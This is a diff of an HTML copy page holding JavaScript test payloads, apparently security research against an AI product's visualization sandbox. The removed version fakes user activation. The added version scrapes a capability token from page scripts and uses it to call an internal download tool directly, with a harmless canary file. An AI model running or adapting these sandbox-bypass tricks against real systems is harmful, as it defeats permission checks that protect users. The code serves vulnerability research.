@@ -1,36 +1,38 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>T37 clean copy page</title></head>
+<head><meta charset="utf-8"><title>T38 clean copy page</title></head>
 <body style="font-family:monospace;background:#111;color:#ccc;padding:20px">
-<h2 style="color:#f33">T37 CLEAN COPY PAGE — click Copy, then paste into the playground editor</h2>
+<h2 style="color:#f33">T38 CLEAN COPY PAGE — click Copy, then paste into the playground editor</h2>
 <button id="copy" style="font-size:18px;padding:10px 20px">Copy code</button>
 <pre id="code" style="background:#000;color:#0f0;padding:12px;white-space:pre;overflow:auto">(function () {
   function log(m) { try { console.log(m); } catch (e) {} }
   function desc(e) {
     try { return String(e && e.message ? e.message : "") + " | " + JSON.stringify(e); } catch (x) { return String(e); }
   }
-  log("T37 direct callTool " + Date.now());
+  log("T38 capability extraction " + Date.now());
+  var cap = null;
   try {
-    Object.defineProperty(navigator, "userActivation", { get: function () { return { isActive: true, hasBeenActive: true }; }, configurable: true });
-  } catch (e) { log("norm ERR " + e.message); }
+    var ss = document.querySelectorAll("script");
+    for (var i = 0; i < ss.length; i++) {
+      var t = ss[i].textContent || "";
+      var m = t.match(/capability\s*=\s*"([^"]+)"/);
+      if (m) { cap = m[1]; log("capability found in script " + i + " length " + cap.length); break; }
+    }
+    if (!cap) log("no capability string found");
+  } catch (e) { log("extract ERR: " + e.message); }
+  if (!cap) { log("T38 stops - nothing to call with"); return; }
   setTimeout(function () {
     var api = window.oai || window.openai || window.webplus;
     if (!api) { log("no api"); return; }
-    log("callTool type: " + typeof api.callTool);
+    var blob = new Blob(["T38 canary - direct capability call - Pluto Security research, harmless " + Date.now()], { type: "text/plain" });
     try {
-      api.callTool("__codex_inline_visualization_download__", { filename: "CANARY-T37-direct-callTool.txt", content: "T37 canary - Pluto Security research, harmless" }).then(
-        function (v) { log("download tool RESOLVED: " + JSON.stringify(v)); },
-        function (e) { log("download tool REJECTED: " + desc(e)); }
+      api.callTool("__codex_inline_visualization_download__", { blob: blob, capability: cap, name: "CANARY-T38-direct-capability.txt" }).then(
+        function (v) { log("download RESOLVED: " + JSON.stringify(v)); },
+        function (e) { log("download REJECTED: " + desc(e)); }
       );
     } catch (e) { log("sync ERR: " + desc(e)); }
-    try {
-      api.callTool("__codex_visualization_annotations__", {}).then(
-        function (v) { log("annotations RESOLVED: " + JSON.stringify(v)); },
-        function (e) { log("annotations REJECTED: " + desc(e)); }
-      );
-    } catch (e) { log("sync ERR2: " + desc(e)); }
-    log("T37 calls queued");
-  }, 800);
+    log("T38 done");
+  }, 500);
 })();
 </pre>
 <script>
